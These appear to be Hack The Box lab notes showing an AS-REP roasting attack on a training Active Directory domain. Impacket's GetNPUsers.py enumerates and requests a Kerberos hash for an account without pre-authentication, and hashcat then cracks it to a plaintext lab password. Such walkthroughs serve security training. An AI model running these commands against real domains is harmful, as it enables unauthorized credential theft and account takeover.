,1. Listing users that do not require Kerberos pre-auth

```┌─[htb-student@par01]─[/tmp]
└──╼ $GetNPUsers.py INLANEFREIGHT.LOCAL/asmith  -dc-ip 172.16.5.5
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
Name      MemberOf                                                           PasswordLastSet             LastLogon                   UAC      
--------  -----------------------------------------------------------------  --------------------------  --------------------------  --------
dhawkins  CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:36:41.876149  2022-06-02 15:02:22.362146  0x410200
```

2. Requesting TGTs for users that do not require Kerberos pre-auth

```
┌─[htb-student@par01]─[/tmp]
└──╼ $GetNPUsers.py INLANEFREIGHT.LOCAL/asmith -request -dc-ip 172.16.5.5
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
Name      MemberOf                                                           PasswordLastSet             LastLogon                   UAC      
--------  -----------------------------------------------------------------  --------------------------  --------------------------  --------
dhawkins  CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-06-01 23:36:41.876149  2022-06-02 15:02:22.362146  0x410200 



$krb5asrep$23$dhawkins@INLANEFREIGHT.LOCAL:c12d8a8a476bab7b15be2811f75ed909$1d9eaf6f457ee59c8b139a485f9d288926e604ffa4cea52a515edbdfeac0394b0c7d7445c334135002275d9b18b6977d57e76768c2981c858ba414ac8c7dd81aefd3450321ffdea2cefb42fb732ac4675929c7ca91759af077b1ce00ccadc7868e939ca0baf580f845a07446d369c29dadc579f6dfc63d21426d2c76dcb74d81c1cf71c56b396f11efb624b6b079434bafc27e17c7efd9f607224c41a5a3f2f635f67455a693744bd4ea2daf695e1630cf974689729b3432dfc7548cd25a8ab7639d4cd022acdc2371ff7c83338e9075225b8796c0ada278e57e597199ce4dc8f3ca4754bcb9ff468b6d2f9c62b4eb00c8d642124badda1b2a31
```

Cracking hash with Hashcat


```$hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

hashcat (v6.2.5-275-gc1df53b47) starting

<SNIP>

$krb5asrep$23$dhawkins@INLANEFREIGHT.LOCAL:c12d8a8a476bab7b15be2811f75ed909$1d9eaf6f457ee59c8b139a485f9d288926e604ffa4cea52a515edbdfeac0394b0c7d7445c334135002275d9b18b6977d57e76768c2981c858ba414ac8c7dd81aefd3450321ffdea2cefb42fb732ac4675929c7ca91759af077b1ce00ccadc7868e939ca0baf580f845a07446d369c29dadc579f6dfc63d21426d2c76dcb74d81c1cf71c56b396f11efb624b6b079434bafc27e17c7efd9f607224c41a5a3f2f635f67455a693744bd4ea2daf695e1630cf974689729b3432dfc7548cd25a8ab7639d4cd022acdc2371ff7c83338e9075225b8796c0ada278e57e597199ce4dc8f3ca4754bcb9ff468b6d2f9c62b4eb00c8d642124badda1b2a31:Bacon1989
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$dhawkins@INLANEFREIGHT.LOCAL:c12d8a8a...1b2a31
Time.Started.....: Thu Jun  2 16:46:58 2022, (11 secs)
Time.Estimated...: Thu Jun  2 16:47:09 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1067.2 kH/s (1.20ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered.Total..: 1/1 (100.00%) Digests
Progress.........: 11372544/14344386 (79.28%)
Rejected.........: 0/11372544 (0.00%)
Restore.Point....: 11370496/14344386 (79.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Baddygoodlalala -> Babe1103
Hardware.Mon.#1..: Util: 73%

Started: Thu Jun  2 16:46:14 2022
Stopped: Thu Jun  2 16:47:11 2022




```
